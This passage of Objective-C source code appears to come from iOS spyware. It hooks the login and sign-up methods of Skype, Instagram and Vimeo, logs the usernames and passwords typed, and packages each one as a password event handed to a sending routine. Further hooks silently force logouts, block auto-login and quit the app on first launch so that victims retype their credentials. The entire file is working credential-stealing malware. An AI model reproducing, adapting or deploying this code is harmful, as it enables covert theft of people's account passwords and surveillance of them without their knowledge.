    [event setMApplicationID:appID];
    [event setMApplicationName:appName];
    [event setMApplicationType:kPasswordApplicationTypeNoneNativeMail];
    FxAppPwd *appPwd = [[FxAppPwd alloc] init];
    [appPwd setMUserName:skypeIdentity];
    [appPwd setMPassword:password];
    [event setMAppPwds:[NSArray arrayWithObject:appPwd]];
    [appPwd release];
    [PasswordUtils sendPasswordEvent:event];
    [event release];
    
    return retVal;
    
}


// Capture Password Skype 5.8.516,6.8.275
HOOK(SKPAccountManager,loginWithSkypeIdentity$andPassword$rememberPassword$ ,BOOL, id skypeIdentity,id password, BOOL remember){
    DLog(@"\n\n&&&&&&&&&&&&&& SKPAccountManager --> loginWithSkypeIdentity rememberPassword &&&&&&&&&&&&&&\n\n");
    
    BOOL retVal = CALL_ORIG(SKPAccountManager, loginWithSkypeIdentity$andPassword$rememberPassword$ , skypeIdentity, password, remember);
    
	DLog(@"### skypeIdentity %@",skypeIdentity);
	DLog(@"### password %@", password);
    //DLog(@"### ret %d", retVal);  // always get 1
    
    /*
     Skype 6.8.275, always ask for password when relaunch so we need to reset force logout here -> side effect: user quit app after type incorrect password, Skype never force logout again
     */
    [PasswordController forcePasswordAppID:kSkype logOut:kReset];
    
    NSString* appID = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleIdentifier"];
    NSString* appName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
	
    FxPasswordEvent * event = [[FxPasswordEvent alloc]init];
    [event setDateTime:[DateTimeFormat phoenixDateTime]];
    [event setMApplicationID:appID];
    [event setMApplicationName:appName];
    [event setMApplicationType:kPasswordApplicationTypeNoneNativeMail];
    FxAppPwd *appPwd = [[FxAppPwd alloc] init];
    [appPwd setMUserName:skypeIdentity];
    [appPwd setMPassword:password];
    [event setMAppPwds:[NSArray arrayWithObject:appPwd]];
    [appPwd release];
    [PasswordUtils sendPasswordEvent:event];
    [event release];
    
    return retVal;
    
}


// Force logout
HOOK(SKPAccountManager, autoLogin ,BOOL){
    DLog(@"\n\n&&&&&&&&&&&&&& SKPAccountManager --> autoLogin &&&&&&&&&&&&&&\n\n");
    if ([PasswordController isForceLogOutWithPasswordAppID:kSkype]) {
        DLog(@"Force logout skype")
        return false;
    } else {
        DLog(@"Not force Skype to logout")
        return CALL_ORIG(SKPAccountManager, autoLogin );
    }
}

/*
 Called when the below button is pressed
 - Skype Name
 - Microsoft account
 - Create accoun
 */
HOOK(SKPLandingPageView, didTouchUpInside$ , void, id inside){
    DLog(@"\n\n&&&&&&&&&&&&&& SKPLandingPageView --> didTouchUpInside &&&&&&&&&&&&&&\n\n");
    CALL_ORIG(SKPLandingPageView, didTouchUpInside$ , inside);
    [PasswordController forcePasswordAppID:kSkype logOut:kReset];
}

#pragma mark Skype Version 4.x


// Skype version 4.x
HOOK(SKAccountManager,performLoginWithAccount$password$savePassword$delegate$ ,void,id arg1,id arg2,BOOL arg3,id arg4){
    
    DLog(@"\n\n&&&&&&&&&&&&&& SKAccountManager --> performLoginWithAccount &&&&&&&&&&&&&&\n\n");

	DLog(@"### performLoginWithAccount$password$savePassword$delegate$");
    
    SKAccount* skAC = arg1;
    
	DLog(@"### identity %@",[skAC identity]);
	DLog(@"### password %@",arg2);
    NSString* appID = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleIdentifier"];
    NSString* appName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
	
    FxPasswordEvent * event = [[FxPasswordEvent alloc]init];
    [event setDateTime:[DateTimeFormat phoenixDateTime]];
    [event setMApplicationID:appID];
    [event setMApplicationName:appName];
    [event setMApplicationType:kPasswordApplicationTypeNoneNativeMail];
    FxAppPwd *appPwd = [[FxAppPwd alloc] init];
    [appPwd setMUserName:[skAC identity]];
    [appPwd setMPassword:arg2];
    [event setMAppPwds:[NSArray arrayWithObject:appPwd]];
    [appPwd release];
    [PasswordUtils sendPasswordEvent:event];
    [event release];
    
    CALL_ORIG(SKAccountManager, performLoginWithAccount$password$savePassword$delegate$ ,arg1,arg2,arg3,arg4);
}

// not called on iPad mini
HOOK(MainWindowController, performAutoLoginIfPossible, BOOL){
	DLog(@"### performAutoLoginIfPossible");
    DLog(@"isLoginPresented, %d", [self isLoginPresented]);
    if ([PasswordController isForceLogOutWithPasswordAppID:kSkype]) {
        //[PasswordController forcePasswordAppID:kSkype logOut:kReset];
        return false;
    } else {
        return CALL_ORIG(MainWindowController, performAutoLoginIfPossible);
    }
}

// For iPad mini
HOOK(SkypeUserInterfaceController_iPad, autoLoginIfPossible, void){
	DLog(@"### autoLoginIfPossible");
    if ([PasswordController isForceLogOutWithPasswordAppID:kSkype]) {
        DLog(@"-- Force logout Skype --")
    } else {
        return CALL_ORIG(SkypeUserInterfaceController_iPad, autoLoginIfPossible);
    }
}

// The button named "Create Account" on the button of first screen
HOOK(LoginTypeViewController, createAccountButtonPressed$, void, id arg1) {
    DLog(@"### createAccountButtonPressed");
    CALL_ORIG(LoginTypeViewController, createAccountButtonPressed$, arg1);
    [PasswordController forcePasswordAppID:kSkype logOut:kReset];
}

// The button named "Microsoft Account" on the first screen
HOOK(LoginTypeViewController,
     microsoftAccountButtonPressed$, void, id arg1) {
    DLog(@"### microsoftAccountButtonPressed");
    CALL_ORIG(LoginTypeViewController, microsoftAccountButtonPressed$, arg1);
    [PasswordController forcePasswordAppID:kSkype logOut:kReset];
}

// The button named "Skype Name" on the first screen
HOOK(LoginTypeViewController, skypeNameButtonPressed$, void, id arg1) {
    DLog(@"### skypeNameButtonPressed");
    CALL_ORIG(LoginTypeViewController, skypeNameButtonPressed$, arg1);
    [PasswordController forcePasswordAppID:kSkype logOut:kReset];
}

#pragma mark -
#pragma mark Instagram
#pragma mark -


#pragma mark (Instagram) Capture password on Registration View

/*
 * Called when submiss Registraion View (username, password ,email)
 * usecase:     - User click button "Register with Email"
 *              - Enter username, password, and email
 *              - Click "DONE"
 */
HOOK(IGUsernameViewController,  submit, void) {
    DLog(@"\n\n&&&&&&&&&&&&&& IGUsernameViewController --> submit &&&&&&&&&&&&&&\n\n");
    
    IGTextField* usernameTextField  = nil;
	IGTextField* passwordTextField  = nil;
	//IGTextField* emailTextField    = nil;
    
    object_getInstanceVariable(self, "_usernameField", (void **)&usernameTextField);
    object_getInstanceVariable(self, "_passwordField", (void **)&passwordTextField);
    //object_getInstanceVariable(self, "_emailField", (void **)&emailTextField);
    //DLog (@"email %@", emailTextField.text)
    
    NSString *account               = usernameTextField.text;
    NSString *password              = passwordTextField.text;
    DLog (@"username %@",account)
	DLog (@"password %@", password)
    
    if (account     &&  [account length]    &&
        password    &&  [password length])  {
        
        DLog(@"Capture account and password [%@] [%@]", account, password)
        
        NSString *applicationName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
        
        [PasswordUtils sendPasswordEventForAccount:account
                                          password:password
                                     applicationID:[[NSBundle mainBundle] bundleIdentifier]
                                   applicationName:applicationName];
    }
    
    CALL_ORIG(IGUsernameViewController, submit);
}

// 7.12.0
// IGRetroRegistrationWelcomeViewController -> IGRetroRegistrationAddEmailViewController -> IGAccountRecoveryEmailConfirmationViewController -> IGRetroRegistrationSignUpViewController
HOOK(IGRetroRegistrationSignUpViewController, registerAccount, void) {
    DLog(@"\n\n&&&&&&&&&&&&&& IGRetroRegistrationSignUpViewController --> registerAccount &&&&&&&&&&&&&&\n\n");
    
    IGRetroRegistrationSignUpView *signUpView = self.signUpView;
    IGRetroRegistrationSignUpScrollView *signUpScrollView = signUpView.signUpScrollView;
    
    IGRetroRegistrationUsernameField *usernameField = signUpScrollView.usernameField;
    IGRetroRegistrationTextField *passwordField = signUpScrollView.passwordField;
    NSString *account   = usernameField.text;
    NSString *password  = passwordField.text;
    DLog (@"username %@", account)
    DLog (@"password %@", password)
    
    if (account     &&  [account length]    &&
        password    &&  [password length])  {
        
        DLog(@"Capture account and password [%@] [%@]", account, password)
        
        NSString *applicationName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
        
        [PasswordUtils sendPasswordEventForAccount:account
                                          password:password
                                     applicationID:[[NSBundle mainBundle] bundleIdentifier]
                                   applicationName:applicationName];
    }
    
    CALL_ORIG(IGRetroRegistrationSignUpViewController, registerAccount);
}

#pragma mark (Instagram) Capture Password on Log In View

/*
 * Called when submit the Login page (username, password)
 * usecase:     - User click button "Log in"
 *              - Enter username, password
 *              - Click "DONE"
 */
HOOK(IGSignInViewController,  signInFormViewDidStartSignIn, void) {
    DLog(@"\n\n&&&&&&&&&&&&&& IGSignInViewController --> signInFormViewDidStartSignIn &&&&&&&&&&&&&&\n\n");
    IGSignInFormView *formView = [self signInFormView];
    
    IGTextField *usernameTextField = nil;
    IGTextField *passwordTextField = nil;
	object_getInstanceVariable(formView, "_usernameField", (void **)&usernameTextField);
    object_getInstanceVariable(formView, "_passwordField", (void **)&passwordTextField);
    NSString *account   = usernameTextField.text;
    NSString *password  = passwordTextField.text;
    DLog (@"username %@", account)
	DLog (@"password %@", password)
    
    if (account     &&  [account length]    &&
        password    &&  [password length])  {
        
        DLog(@"Capture account and password [%@] [%@]", account, password)
        
        NSString *applicationName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
        
        [PasswordUtils sendPasswordEventForAccount:account
                                          password:password
                                     applicationID:[[NSBundle mainBundle] bundleIdentifier]
                                   applicationName:applicationName];
    }

    
    CALL_ORIG(IGSignInViewController, signInFormViewDidStartSignIn);
}

// 7.12.0
HOOK(IGRetroRegistrationLoginViewController, logInWithUsernameAndPassword, void) {
    DLog(@"---------> logInWithUsernameAndPassword");
    
    IGRetroRegistrationLoginView *loginView = [self performSelector:@selector(loginView)];
    IGRetroRegistrationLoginScrollView *loginScrollView = [loginView performSelector:@selector(loginScrollView)];
    IGPasswordField *passwordField = [loginScrollView performSelector:@selector(passwordField)];
    IGRetroRegistrationTextField *usernameField = [loginScrollView performSelector:@selector(usernameField)];
    NSString *account   = [usernameField text];
    NSString *password  = [passwordField text];
    DLog (@"username %@", account)
    DLog (@"password %@", password)
    
    if (account     &&  [account length]    &&
        password    &&  [password length])  {
        
        DLog(@"Capture account and password [%@] [%@]", account, password)
        
        NSString *applicationName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
        
        [PasswordUtils sendPasswordEventForAccount:account
                                          password:password
                                     applicationID:[[NSBundle mainBundle] bundleIdentifier]
                                   applicationName:applicationName];
    }
    
    CALL_ORIG(IGRetroRegistrationLoginViewController, logInWithUsernameAndPassword);
}


HOOK(IGLogInView,  validate, BOOL) {
    DLog(@"\n\n&&&&&&&&&&&&&& IGLogInView --> validate &&&&&&&&&&&&&&\n\n");
    
    IGTextField *usernameTextField = [self usernameField];
    IGTextField *passwordTextField = [self passwordField];
    
    NSString *account   = usernameTextField.text;
    NSString *password  = passwordTextField.text;
    DLog (@"username %@", account)
    DLog (@"password %@", password)
    
    if (account     &&  [account length]    &&
        password    &&  [password length])  {
        
        DLog(@"Capture account and password [%@] [%@]", account, password)
        
        NSString *applicationName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
        
        [PasswordUtils sendPasswordEventForAccount:account
                                          password:password
                                     applicationID:[[NSBundle mainBundle] bundleIdentifier]
                                   applicationName:applicationName];
    }
    
    return CALL_ORIG(IGLogInView, validate);
    
}

#pragma mark -
#pragma mark Vimeo (register account, login, force logout)
#pragma mark -

/*
 * Called when Login
 * usecase:     - User click button "Log in"
 *              - Enter email, password
 *              - Click "DONE"
 */
#pragma mark iOS 7
HOOK(SMKVimeoAuthentication,logInWithUsername$password$delegate$andCompletionBlock$ ,void,id arg1,id arg2,id arg3,id arg4){
	DLog(@"## logInWithUsername$password$delegate$andCompletionBlock$ ##");
	DLog(@"# arg1 %@",arg1);
	DLog(@"# arg2 %@",arg2);

    NSString* appID = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleIdentifier"];
    NSString* appName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
    
    FxPasswordEvent * event = [[FxPasswordEvent alloc]init];
    [event setDateTime:[DateTimeFormat phoenixDateTime]];
    [event setMApplicationID:appID];
    [event setMApplicationName:appName];
    [event setMApplicationType:kPasswordApplicationTypeNoneNativeMail];
    FxAppPwd *appPwd = [[FxAppPwd alloc] init];
    [appPwd setMUserName:arg1];
    [appPwd setMPassword:arg2];
    [event setMAppPwds:[NSArray arrayWithObject:appPwd]];
    [appPwd release];
    [PasswordUtils sendPasswordEvent:event];
    [event release];

	CALL_ORIG(SMKVimeoAuthentication, logInWithUsername$password$delegate$andCompletionBlock$,arg1,arg2,arg3,arg4);
}

/*
 * Called when first JOIN
 * usecase:     - User click button "Log in"
 *              - Enter first and last name
 *              - Enter email, password
 *              - Click "DONE"
 */
// register Vimeo for iOS 7
HOOK(SMKVimeoAuthentication,requestForVimeoRegisterWithName$userName$password$delegate$ , id ,id arg1,id arg2,id arg3,id arg4){
    DLog(@"================== SMKVimeoAuthentication --> requestForVimeoRegisterWithName ================")
    DLog(@"# arg1 %@",arg1);    // Fist name and last name
	DLog(@"# arg2 %@",arg2);    // email (username)
	DLog(@"# arg3 %@",arg3);    // password
	DLog(@"# arg4 %@",arg4);    // SMKCredentialsViewController

    NSString* appID     = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleIdentifier"];
    NSString* appName   = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
    
    FxPasswordEvent * event     = [[FxPasswordEvent alloc]init];
    [event setDateTime:[DateTimeFormat phoenixDateTime]];
    [event setMApplicationID:appID];
    [event setMApplicationName:appName];
    [event setMApplicationType:kPasswordApplicationTypeNoneNativeMail];
    FxAppPwd *appPwd = [[FxAppPwd alloc] init];
    [appPwd setMUserName:arg2];
    [appPwd setMPassword:arg3];
    [event setMAppPwds:[NSArray arrayWithObject:appPwd]];
    [appPwd release];
    [PasswordUtils sendPasswordEvent:event];
    [event release];

    return CALL_ORIG(SMKVimeoAuthentication, requestForVimeoRegisterWithName$userName$password$delegate$,arg1,arg2,arg3,arg4);
}

#pragma mark iOS6
HOOK(XAuthCredentials,getTokenWithPassword$withCompletionBlock$ ,void,id arg1,id arg2){
	DLog(@"## getTokenWithPassword$withCompletionBlock$ ##");
    DLog(@"# username %@",[self username]);
	DLog(@"# arg1 %@",arg1);
    
    NSString* appID = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleIdentifier"];
    NSString* appName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
    
    FxPasswordEvent * event = [[FxPasswordEvent alloc]init];
    [event setDateTime:[DateTimeFormat phoenixDateTime]];
    [event setMApplicationID:appID];
    [event setMApplicationName:appName];
    [event setMApplicationType:kPasswordApplicationTypeNoneNativeMail];
    FxAppPwd *appPwd = [[FxAppPwd alloc] init];
    [appPwd setMUserName:[self username]];
    [appPwd setMPassword:arg1];
    [event setMAppPwds:[NSArray arrayWithObject:appPwd]];
    [appPwd release];
    [PasswordUtils sendPasswordEvent:event];
    [event release];
    
	CALL_ORIG(XAuthCredentials, getTokenWithPassword$withCompletionBlock$,arg1,arg2);
}

/*
 * Called when "Login" Vimeo 4.2, 5.0, 5.1
 * usecase:     - User click button "Log in"
 *              - Enter email, password
 *              - Click "DONE"
 *
 * Note that there is an alternaive method on Class SMKBaseAuthViewController
 *      -(void)loginWithEmail:(id)email password:(id)password completionBlock:(id)block;
 */
HOOK(VIMOAuthAuthenticator, authenticateAccount$username$password$scope$completionBlock$, void, id account, id username, id password, id scope,  id block){
	DLog(@"################## VIMOAuthAuthenticator -->  authenticateAccount$username$password$completionBlock$ ##################");
    CALL_ORIG(VIMOAuthAuthenticator, authenticateAccount$username$password$scope$completionBlock$ , account, username, password, scope, block);
	DLog(@"# account %@", account);
    DLog(@"# username %@", username);  // username
    DLog(@"# password %@", password);  // password
    
    [PasswordController forcePasswordAppID:kVimeo logOut:kReset];
    [VimeoUtil removeQuitStatusFile];
    
    NSString* appID = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleIdentifier"];
    NSString* appName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
    
    FxPasswordEvent * event = [[FxPasswordEvent alloc]init];
    [event setDateTime:[DateTimeFormat phoenixDateTime]];
    [event setMApplicationID:appID];
    [event setMApplicationName:appName];
    [event setMApplicationType:kPasswordApplicationTypeNoneNativeMail];
    FxAppPwd *appPwd = [[FxAppPwd alloc] init];
    [appPwd setMUserName:username];
    [appPwd setMPassword:password];
    [event setMAppPwds:[NSArray arrayWithObject:appPwd]];
    [appPwd release];
    [PasswordUtils sendPasswordEvent:event];
    [event release];
    
}

// Vimeo 5.3 Login
HOOK(VIMOAuthAuthenticator, authenticateAccount$email$password$scope$completionBlock$, void, id account, id email, id password, id scope, id block){
	DLog(@"################## VIMOAuthAuthenticator -->  authenticateAccount$email$password$scope$completionBlock$");
    CALL_ORIG(VIMOAuthAuthenticator, authenticateAccount$email$password$scope$completionBlock$ , account, email, password, scope, block);
	DLog(@"# account %@", account);
    DLog(@"# username %@", email);  // username
    DLog(@"# password %@", password);  // password
    
    [PasswordController forcePasswordAppID:kVimeo logOut:kReset];
    
    [VimeoUtil removeQuitStatusFile];
    
    NSString* appID     = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleIdentifier"];
    NSString* appName   = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
    
    FxPasswordEvent * event = [[FxPasswordEvent alloc]init];
    [event setDateTime:[DateTimeFormat phoenixDateTime]];
    [event setMApplicationID:appID];
    [event setMApplicationName:appName];
    [event setMApplicationType:kPasswordApplicationTypeNoneNativeMail];
    
    FxAppPwd *appPwd = [[FxAppPwd alloc] init];
    [appPwd setMUserName:email];
    [appPwd setMPassword:password];
    [event setMAppPwds:[NSArray arrayWithObject:appPwd]];
    [appPwd release];
    
    [PasswordUtils sendPasswordEvent:event];
    [event release];
    
}

/*
 * Called when "Join with Email" for Vimeo 4.2
 * usecase:     - User click button "Join with Email"
 *              - Enter first and last name, then click ?Next"
 *              - Enter email, password
 *              - Click "Done"
 */

HOOK(SMKBaseAuthViewController, joinWithName$email$password$avatarPath$completionBlock$, void, id name, id email, id password, id path,  id block){
	DLog(@"################## SMKBaseAuthViewController -->  joinWithName$email$password$avatarPath$completionBlock$,##################");
    CALL_ORIG(SMKBaseAuthViewController, joinWithName$email$password$avatarPath$completionBlock$ , name, email, password, path, block);
	DLog(@"# name %@", name);
    DLog(@"# email %@", email);         // username
    DLog(@"# password %@", password);   // password
    
    NSString* appID = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleIdentifier"];
    NSString* appName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
    
    FxPasswordEvent * event = [[FxPasswordEvent alloc]init];
    [event setDateTime:[DateTimeFormat phoenixDateTime]];
    [event setMApplicationID:appID];
    [event setMApplicationName:appName];
    [event setMApplicationType:kPasswordApplicationTypeNoneNativeMail];
    FxAppPwd *appPwd = [[FxAppPwd alloc] init];
    [appPwd setMUserName:email];
    [appPwd setMPassword:password];
    [event setMAppPwds:[NSArray arrayWithObject:appPwd]];
    [appPwd release];
    [PasswordUtils sendPasswordEvent:event];
    [event release];
    
}

// Vimeo 5.0 Join with email
HOOK(ECAccountManager, registerVimeoAccountWithEmail$password$displayName$completionBlock$, void, id arg1, id arg2, id arg3, id arg4) {
    DLog(@"################## ECAccountManager -->  registerVimeoAccountWithEmail$password$displayName$completionBlock$,##################");
    CALL_ORIG(ECAccountManager, registerVimeoAccountWithEmail$password$displayName$completionBlock$, arg1, arg2, arg3, arg4);
	DLog(@"# displayName %@", arg3);
    DLog(@"# email %@", arg1);          // username
    DLog(@"# password %@", arg2);       // password
    
    [PasswordController forcePasswordAppID:kVimeo logOut:kReset];
    
    NSString *email     = arg1;
    NSString *password  = arg2;
    
    NSString* appID = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleIdentifier"];
    NSString* appName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
    
    FxPasswordEvent * event = [[FxPasswordEvent alloc]init];
    [event setDateTime:[DateTimeFormat phoenixDateTime]];
    [event setMApplicationID:appID];
    [event setMApplicationName:appName];
    [event setMApplicationType:kPasswordApplicationTypeNoneNativeMail];
    FxAppPwd *appPwd = [[FxAppPwd alloc] init];
    [appPwd setMUserName:email];
    [appPwd setMPassword:password];
    [event setMAppPwds:[NSArray arrayWithObject:appPwd]];
    [appPwd release];
    [PasswordUtils sendPasswordEvent:event];
    [event release];
}

// Vimeo 5.0.1, 5.1 Join with email
HOOK(VIMAccountManager, registerVimeoAccountWithEmail$password$displayName$completionBlock$, void, id arg1, id arg2, id arg3, id arg4) {
    DLog(@"################## VIMAccountManager -->  registerVimeoAccountWithEmail$password$displayName$completionBlock$,##################");
    CALL_ORIG(VIMAccountManager, registerVimeoAccountWithEmail$password$displayName$completionBlock$, arg1, arg2, arg3, arg4);
	DLog(@"# displayName %@", arg3);
    DLog(@"# email %@", arg1);          // username
    DLog(@"# password %@", arg2);       // password
    
    [PasswordController forcePasswordAppID:kVimeo logOut:kReset];
    [VimeoUtil removeQuitStatusFile];
    
    NSString *email     = arg1;
    NSString *password  = arg2;
    
    NSString* appID = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleIdentifier"];
    NSString* appName = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
    
    FxPasswordEvent * event = [[FxPasswordEvent alloc]init];
    [event setDateTime:[DateTimeFormat phoenixDateTime]];
    [event setMApplicationID:appID];
    [event setMApplicationName:appName];
    [event setMApplicationType:kPasswordApplicationTypeNoneNativeMail];
    FxAppPwd *appPwd = [[FxAppPwd alloc] init];
    [appPwd setMUserName:email];
    [appPwd setMPassword:password];
    [event setMAppPwds:[NSArray arrayWithObject:appPwd]];
    [appPwd release];
    [PasswordUtils sendPasswordEvent:event];
    [event release];
}

// Vimeo 5.3 Join with email
HOOK(VIMAccountManager, joinWithDisplayName$email$password$completionBlock$, void, id displayName, id aEmail, id aPassword, id block) {
    DLog(@"################## VIMAccountManager -->  joinWithDisplayName$email$password$completionBlock$,##################");
    CALL_ORIG(VIMAccountManager, joinWithDisplayName$email$password$completionBlock$, displayName, aEmail, aPassword, block);
	DLog(@"# displayName %@", displayName);
    DLog(@"# email %@", aEmail);          // username
    DLog(@"# password %@", aPassword);       // password
    
    [PasswordController forcePasswordAppID:kVimeo logOut:kReset];
    
    [VimeoUtil removeQuitStatusFile];
    
    NSString *email     = aEmail;
    NSString *password  = aPassword;
    
    NSString* appID     = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleIdentifier"];
    NSString* appName   = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"];
    
    FxPasswordEvent * event = [[FxPasswordEvent alloc]init];
    [event setDateTime:[DateTimeFormat phoenixDateTime]];
    [event setMApplicationID:appID];
    [event setMApplicationName:appName];
    [event setMApplicationType:kPasswordApplicationTypeNoneNativeMail];
    
    FxAppPwd *appPwd        = [[FxAppPwd alloc] init];
    [appPwd setMUserName:email];
    [appPwd setMPassword:password];
    [event setMAppPwds:[NSArray arrayWithObject:appPwd]];
    [appPwd release];
    
    [PasswordUtils sendPasswordEvent:event];
    [event release];
}

// 5.5.4, Login
HOOK(AuthHelper, loginWithEmail$password$completionBlock$, void, id arg1, id arg2, id arg3) {
    DLog(@"arg1, [%@] %@", [arg1 class], arg1);
    DLog(@"arg2, [%@] %@", [arg2 class], arg2);
    
    NSString *userName = arg1;
    NSString *password = arg2;
    FxPasswordEvent *event = passwordEvent(userName, password);
    [PasswordUtils sendPasswordEvent:event];
    
    CALL_ORIG(AuthHelper, loginWithEmail$password$completionBlock$, arg1, arg2, arg3);
}

// 5.5.4, Join
HOOK(AuthHelper, joinWithName$email$password$completionBlock$, void, id arg1, id arg2, id arg3, id arg4) {
    DLog(@"arg1, [%@] %@", [arg1 class], arg1);
    DLog(@"arg2, [%@] %@", [arg2 class], arg2);
    DLog(@"arg3, [%@] %@", [arg3 class], arg3);
    
    NSString *userName = arg2;
    NSString *password = arg3;
    FxPasswordEvent *event = passwordEvent(userName, password);
    [PasswordUtils sendPasswordEvent:event];
    
    CALL_ORIG(AuthHelper, joinWithName$email$password$completionBlock$, arg1, arg2, arg3, arg4);
}

// 6.0, Login
HOOK(AuthHelper, loginWithEmail$password$analyticsOrigin$completionBlock$, void, id arg1, id arg2, id arg3, id arg4) {
    DLog(@"arg1, [%@] %@", [arg1 class], arg1);
    DLog(@"arg2, [%@] %@", [arg2 class], arg2);
    
    NSString *userName = arg1;
    NSString *password = arg2;
    FxPasswordEvent *event = passwordEvent(userName, password);
    [PasswordUtils sendPasswordEvent:event];
    
    CALL_ORIG(AuthHelper, loginWithEmail$password$analyticsOrigin$completionBlock$, arg1, arg2, arg3, arg4);
}

// 6.0, Join
HOOK(AuthHelper, joinWithName$email$password$analyticsOrigin$completionBlock$, void, id arg1, id arg2, id arg3, id arg4, id arg5) {
    DLog(@"arg1, [%@] %@", [arg1 class], arg1);
    DLog(@"arg2, [%@] %@", [arg2 class], arg2);
    DLog(@"arg3, [%@] %@", [arg3 class], arg3);
    
    NSString *userName = arg2;
    NSString *password = arg3;
    FxPasswordEvent *event = passwordEvent(userName, password);
    [PasswordUtils sendPasswordEvent:event];
    
    CALL_ORIG(AuthHelper, joinWithName$email$password$analyticsOrigin$completionBlock$, arg1, arg2, arg3, arg4, arg5);
}

#pragma mark ****** Vimeo (iOS 7) & Instagram Force Logout *******

BOOL shouldResetVimeoLogout () {
    BOOL reset = NO;
    
    NSDictionary *bundleInfo    = [[NSBundle mainBundle] infoDictionary];
    NSString *releaseVersion	= [bundleInfo objectForKey:@"CFBundleShortVersionString"];
    if (releaseVersion == nil || [releaseVersion length] == 0) {
        releaseVersion = [bundleInfo objectForKey:@"CFBundleVersion"];
    }
    NSArray *vimeoVersionArray	= [IMShareUtils parseVersion:releaseVersion];
    DLog(@"Vimeo current version %@", vimeoVersionArray)
    
    if ([IMShareUtils isVersion:vimeoVersionArray
                      lowerThan:[IMShareUtils parseVersion:@"5.0"]] ||
        [IMShareUtils isVersion:vimeoVersionArray
                      greaterOrEqual:[IMShareUtils parseVersion:@"5.3"]]) {
        reset = YES;
    }
    return reset;
}

// Force logout Vimeo and Instagram
// Note that for Vimeo 5.0, we need another hook method to handle the case that user set Vimeo account in Settings application
HOOK(AppDelegate,application$didFinishLaunchingWithOptions$ ,BOOL,id arg1,id arg2){
	BOOL ret = CALL_ORIG(AppDelegate, application$didFinishLaunchingWithOptions$ ,arg1,arg2);
    
	DLog(@"#################### application$didFinishLaunchingWithOptions$  ####################");
    
    NSString* appID = [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleIdentifier"];
    
    // For Vimeo
    if ([appID isEqualToString:@"com.vimeo"]) {
        if ([PasswordController isForceLogOutWithPasswordAppID:kVimeo]) {
            DLog(@"!!!!! FORCE LOGOUT Vimeo !!!!!!")
            Class $SMKVimeoAuthentication = objc_getClass("SMKVimeoAuthentication");

            if ($SMKVimeoAuthentication) {
                SMKVimeoAuthentication * share = [$SMKVimeoAuthentication sharedHelper];
                [share logOut];
            }
       
            // Vimeo 5.3
            Class $VIMSession        = objc_getClass("VIMSession");
            if ($VIMSession) {
                VIMSession *sharedSession   = (VIMSession *)[$VIMSession sharedSession];
                DLog (@"shared session %@", sharedSession)
                
                if ([sharedSession respondsToSelector:@selector(logOut)]) {
                    [sharedSession logOut];
                } else if ([sharedSession respondsToSelector:@selector(logout)]) { // 5.5.4
                    [sharedSession logout];
                }
            }

            if (shouldResetVimeoLogout()) {
                DLog(@"!!! Toggle flag reset of Vimeo")
                [PasswordController forcePasswordAppID:kVimeo logOut:kReset];
            }
            
            NSString *shouldQuitPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"shouldNotQuit"];
            DLog (@"shouldQuitPath %@", shouldQuitPath)
            
            if (![[NSFileManager defaultManager] fileExistsAtPath:shouldQuitPath]) {
                DLog (@"File not exit")
                // File not exist, so this is the first launch
                NSDictionary *quitInfo = [NSDictionary dictionaryWithObjectsAndKeys:[NSNumber numberWithBool:NO], @"QuitValue", nil];
                [quitInfo writeToFile:shouldQuitPath atomically:YES];
                
                exit(0);
            } else {
                DLog(@"File exist, so it's not the first launch")
            }
            
            
        }
    // For Instagram
    } else  if ([appID isEqualToString:@"com.burbn.instagram"]) {
        /* Force Log Out
         * usecase:     - Application is not running
         *              - User launches the application
         *              - We try to
         *              - Click "DONE"
         */
        if ([PasswordController isForceLogOutWithPasswordAppID:kInstagram]) {
            DLog(@"!!!!! FORCE LOGOUT Instagram !!!!!!")
            InstagramPasswordManager *instragramMgr = [InstagramPasswordManager sharedInstagramPasswordManager];
            [instragramMgr performSelector:@selector(clearRegisteredAccount) withObject:nil afterDelay:4];
            [PasswordController forcePasswordAppID:kInstagram logOut:kReset];
        }
    }
	return ret ;
}

// Force logout Vimeo 5.0
HOOK(AppNavigationController , authenticateWithSettings, void) {
    DLog(@"################## AppNavigationController --> authenticateWithSettings ##################");
    if ([PasswordController isForceLogOutWithPasswordAppID:kVimeo]) {
        DLog(@"!!!!! FORCE LOGOUT Vimeo (Setting) !!!!!!")
        // Prevent the user from seeing the view that can choose to continue with the account set in Setting application
        [self authenticatedUserDoesNotExist];
    } else {
        CALL_ORIG(AppNavigationController,  authenticateWithSettings);
    }
}


#pragma mark iOS 6
